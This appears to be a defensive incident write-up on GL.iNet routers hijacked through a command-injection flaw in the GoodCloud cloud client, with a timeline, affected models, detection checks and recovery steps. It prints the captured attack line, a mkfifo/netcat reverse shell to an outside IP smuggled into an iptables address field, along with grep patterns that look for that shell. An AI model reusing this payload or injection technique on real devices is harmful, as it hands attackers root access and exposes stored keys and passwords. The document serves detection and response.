# The remote shell on routers, and the cloud command behind it

First posted in the GL.iNet forum on 21 November 2026 ([post 34](https://forum.gl-inet.com/t/quickly-check-if-your-router-is-under-attack/73070/34)).
Findings R-1 to R-9 and R-13 to R-17 in [findings.md](findings.md). Times are UTC. Last updated 22 November 2026.

## Which routers

This is not a GL-AXT1800 (Slate AX) problem. That model is where the shell was found; the code
that let it in is in other models too.

- **The unchecked code** is in every GoodCloud client we have read from GL-MT3000 firmware 4.7.0
  (released 2024-12-05) to 4.11.0, and in GL-AXT1800 4.8.2, 4.8.3 and 4.8.4.
  It follows the build of the cloud package `gl-sdk4-cloud`, not the firmware number or whether
  a model offers AstroWarp: the package of 4.6.9 (build `git-2024.212`) already had an AstroWarp
  module without this code, and the code is there from build `git-2024.337` on, which GL-MT3000 4.7.0
  and GL-MT6000 4.7.0 both carry.
- **The attacker used it on at least seven models.** Routers we manage of the models GL-AXT1800,
  GL-AX1800, GL-MT2500, GL-MT3000, GL-MT5000, GL-MT6000 and GL-MT3600BE, on firmware from 4.7.4 to
  4.9.0, show the firewall rule this command leaves. On seven of them we recovered the command
  itself: it ran as root, looked for the folders of the KVM implant and sent the result to the
  attacker's server. See findings R-15 and R-17.
- **The interactive shell described below** has so far been found only on GL-AXT1800, firmware
  4.8.2 and 4.8.3.

## What was running on our GL-AXT1800 (read at 15:25 UTC on November 21)

```
sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 42499 >/tmp/f;sleep 3;done) >/dev/null 2>&1 &
/bin/sh -i
nc 170.39.226.219 42499
```

All three ran as root, and `netstat` showed the connection to 170.39.226.219:42499 as ESTABLISHED. That is an interactive root shell handed to a remote host.

## The reports line up

| Report | Model / firmware | Remote end | Process start |
|---|---|---|---|
| forum post 10 | AXT1800 4.8.3 | 170.39.226.219:43104 | not stated |
| forum post 22 | AXT1800 4.8.3 | 170.39.226.219:43149 | about 21:40 UTC, Nov 20 |
| ours | AXT1800 4.8.3 | 170.39.226.219:42499 | 21:40 UTC, Nov 20 |
| a router we manage | AXT1800 4.8.2 | 170.39.226.219:41221 | three shells: 20:46:35, 21:17:27 and 21:39:45 UTC, Nov 20 |
| a router we manage | AXT1800 4.8.2 | 170.39.226.219:41297 | 21:39:47 UTC, Nov 20 |

Same address, a different port in each, and a shell started within a minute of 21:40 on all four where it was measured (ours are from the process start time in `/proc`). The two routers on 4.8.2 had not been restarted and the shells were still running when we checked them on 22 November. Since then we have found it running on three more routers we manage, one on 4.8.2 and two on 4.8.3; counts are in the [field survey](field-survey.md).

## How it got in

The reverse shell sits where an IP address belongs in an `iptables` command, and that command comes from the GoodCloud client on the router. The client (package `gl-sdk4-cloud`, as shipped in 4.8.3) has a handler for one of the AstroWarp / SD-WAN cloud commands. It builds `iptables -t nat -A SDWAN_IP_MAPPING -d <address> -j DNAT --to-destination <address>` from two values in the cloud message and passes the line to the shell, with no validation or quoting of either value. We read this in the client's code taken from this router. That client module is the only place on the router that builds this rule.

So this came down the cloud management channel as a crafted address. Two things follow:

- AstroWarp is not in use on this router (`mptun.global.enable='0'`, no AstroWarp tunnel running). The handler does not check that, so having the feature off did not help.
- The same handler is also in 4.8.4 (a build dated November 11, 2026). We compared the two and they are identical.

## Timeline on our router (UTC, November 20)

- 20:47:14: the handler ran for the first time. It creates the state file `/etc/mp_ip_mapping_info`, and this is that file's creation time. On the two routers on 4.8.2 the first call came at 20:46:35 and 20:46:37.
- 21:40:24: the shell started.
- 21:54:38: last data received from the remote end, going by the timestamp on the shell's FIFO.
- 22:15:18: the handler ran for the last time and rewrote the state file, empty.
- The shell stayed connected until we killed it at 15:42 UTC on November 21.

## It is not the indicator GL published

There was no `crond -i /tmp/.log` process on this router. `ps | grep tmp` does list the shell, on ours as a `cat /tmp/f` line, but only because its FIFO happens to be in `/tmp`, and the instructions say anything other than `crond -i /tmp/.log` means "healthy and secure".

## What it left behind

One file: the empty state file `/etc/mp_ip_mapping_info`, which survives a restart. Apart from that, the only things changed in the router's writable storage on November 19–21 are the web UI's error log and what we changed ourselves when we shut it down: no startup script, crontab, SSH key file or password file. We checked inode change times as well as modification times. Forum post 22 reports the process gone after a reboot.

Two cautions. A root shell can do damage that leaves no file, starting with reading every key and password on the router. And a router that has been rebooted or upgraded since November 20 can pass every process check even if it was hit.

## A check that catches this one (over SSH on the router)

```
ps w | grep -E 'crond -i|mkfifo|nc [0-9]|sh -i' | grep -v grep
```

```
netstat -nt | grep '170.39.226.'
```

```
ls -la /tmp/f
```

```
ls -la /etc/mp_ip_mapping_info
```

Lines like the ones at the top are a hit; so is any output from the second command. The third matters if the shell has already been killed: `/tmp/f` is the shell's named pipe (the line starts with `p`), and on ours it is still there after we killed the processes. It only goes away at a reboot. No output from the first three only means it is not running and has not run since the last boot. The fourth is the one check that still works after a restart: an empty file dated 20 November or later, on a router that does not use AstroWarp, means the handler ran there. It does not show what the message carried.

## If you get a hit

Do not restart the router yet. Save the evidence first, then follow the steps in
[If you find something](../README.md#if-you-find-something). Killing the processes ended the shell
on ours, but neither that nor a reboot undoes the compromise: treat every secret stored on that
router as read by someone else (VPN keys and configs, Wi-Fi passwords, the admin password hash,
anything else it holds), reinstall the firmware without keeping settings, and replace those
secrets where they are used.
